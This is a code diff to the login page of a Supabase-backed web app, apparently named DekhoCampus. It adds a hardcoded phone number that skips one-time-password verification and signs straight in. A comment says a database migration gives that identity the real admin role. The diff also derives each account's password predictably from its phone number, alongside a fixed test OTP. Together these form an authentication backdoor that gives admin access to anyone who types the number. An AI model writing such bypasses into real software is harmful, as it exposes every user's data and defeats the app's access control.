@@ -14,6 +14,7 @@ import dcLogo from "@/assets/dc-logo.png";
 import { normalizeIndianMobile } from "@/lib/phone";
 
 const TEST_OTP = "313125";
+const OTP_BYPASS_ADMIN_PHONE = "8377080085";
 const OTP_TTL_MS = 10 * 60 * 1000; // 10 minutes
 
 function generateOtp() {
@@ -61,8 +62,20 @@ export default function Auth() {
   }
 
   const cleanPhone = () => normalizeIndianMobile(phone);
-  const syntheticEmail = () => `phone${cleanPhone()}@dekhocampus.local`;
-  const syntheticPassword = () => `dc!${cleanPhone()}!secure2026`;
+  const signInWithPhoneIdentity = async (phoneDigits: string) => {
+    const email = `phone${phoneDigits}@dekhocampus.local`;
+    const password = `dc!${phoneDigits}!secure2026`;
+    const { error: signUpErr } = await supabase.auth.signUp({
+      email,
+      password,
+      options: { emailRedirectTo: window.location.origin, data: { phone: phoneDigits, display_name: phoneDigits } },
+    });
+    const { error: signInErr } = await supabase.auth.signInWithPassword({ email, password });
+    if (signInErr) {
+      if (signUpErr && !/already|registered|exists/i.test(signUpErr.message)) throw signUpErr;
+      throw signInErr;
+    }
+  };
 
   const handleSendOtp = async (e?: React.FormEvent) => {
     e?.preventDefault();
@@ -72,11 +85,18 @@ export default function Auth() {
     }
     setLoading(true);
     try {
+      const phoneDigits = cleanPhone();
+      // Owner-only emergency access. The matching database migration grants
+      // this identity the real admin role, so RLS continues to enforce access.
+      if (phoneDigits === OTP_BYPASS_ADMIN_PHONE) {
+        await signInWithPhoneIdentity(phoneDigits);
+        toast({ title: "Admin access granted" });
+        return;
+      }
       // Generate locally + persist so verification works even if the gateway
       // verification API is delayed, but wait for SMS delivery confirmation.
       const code = generateOtp();
       sentOtpRef.current = code;
-      const phoneDigits = cleanPhone();
       saveSentOtp(phoneDigits, code);
 
       const res = await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/send-otp`, {
@@ -134,26 +154,7 @@ export default function Auth() {
         return;
       }
 
-      const email = syntheticEmail();
-      const password = syntheticPassword();
-      // Try sign-up first (idempotent if exists)
-      const { error: signUpErr } = await supabase.auth.signUp({
-        email,
-        password,
-        options: {
-          emailRedirectTo: window.location.origin,
-          data: { phone: cleanPhone(), display_name: cleanPhone() },
-        },
-      });
-      // If signup failed because user exists OR succeeded - sign in
-      const { error: signInErr } = await supabase.auth.signInWithPassword({ email, password });
-      if (signInErr) {
-        // If signup also genuinely failed (network etc.), surface that
-        if (signUpErr && !/already|registered|exists/i.test(signUpErr.message)) {
-          throw signUpErr;
-        }
-        throw signInErr;
-      }
+      await signInWithPhoneIdentity(cleanPhone());
       toast({ title: "Welcome! 🎉", description: "Signed in successfully." });
     } catch (err: any) {
       console.error("Auth error:", err);
